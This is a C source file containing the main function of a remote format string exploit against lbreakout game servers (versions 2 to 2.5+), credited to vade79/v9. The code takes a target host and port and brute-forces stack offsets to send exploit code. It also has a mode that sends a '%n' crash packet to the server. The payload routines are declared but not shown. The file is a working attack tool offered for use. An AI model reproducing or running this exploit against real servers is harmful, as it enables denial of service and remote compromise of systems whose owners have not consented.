
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int EOF ;
 int atoi (int ) ;
 int exit (int ) ;
 int getopt (int,char**,char*) ;
 int getpops (char*,unsigned short) ;
 int optarg ;
 int printe (char*,int) ;
 int printf (char*) ;
 int pt ;
 int send_packet (char*,unsigned short,char*,int,int ) ;
 int sendcode (char*,unsigned short,int,int,int) ;
 scalar_t__ strdup (int ) ;
 int usage (char*) ;

int main(int argc,char **argv){
 unsigned short port=8000;
 unsigned short getpop=0;
 unsigned short brute=0;
 unsigned short crash=0;
 int doffset=0;
 int roffset=0;
 int pops=0;
 int chr=0;
 char *hostname=0;
 while((chr=getopt(argc,argv,"t:h:p:d:r:P:gbc"))!=EOF){
  switch(chr){
   case 't':

    if(atoi(optarg)<0||atoi(optarg)>1)
     usage(argv[0]);
    pt=atoi(optarg);
    break;
   case 'h':
    if(!hostname&&!(hostname=(char *)strdup(optarg)))
     printe("main(): allocating memory failed",1);
    break;
   case 'p':
    port=atoi(optarg);
    break;
   case 'd':
    doffset=(atoi(optarg)*4);
    break;
   case 'r':
    roffset=atoi(optarg);
    break;
   case 'P':
    pops=atoi(optarg);
    break;
   case 'g':
    getpop=1;
    break;
   case 'b':
    brute=1;
    break;
   case 'c':
    crash=1;
    break;
   default:
    usage(argv[0]);
    break;
  }
 }
 if(!hostname)
  usage(argv[0]);
 printf(
 "[*] lbreakout[2-2.5+]: remote format string exploit"
 ".\n[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakeh"
 "alo)\n\n");
 if(getpop){
  getpops(hostname,port);
  exit(0);
 }
 else if(crash){

  printf("[*] sending server crash code.\n");

  send_packet(hostname,port,"\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x03\x04%n",12,0);
 }
 else{
  if(brute){
   for(doffset=0;doffset<444;doffset+=4)
    sendcode(hostname,port,doffset,roffset,pops);
   printf("[!] brute force failed.\n");
  }
  else
   sendcode(hostname,port,doffset,roffset,pops);
 }
 exit(0);
}
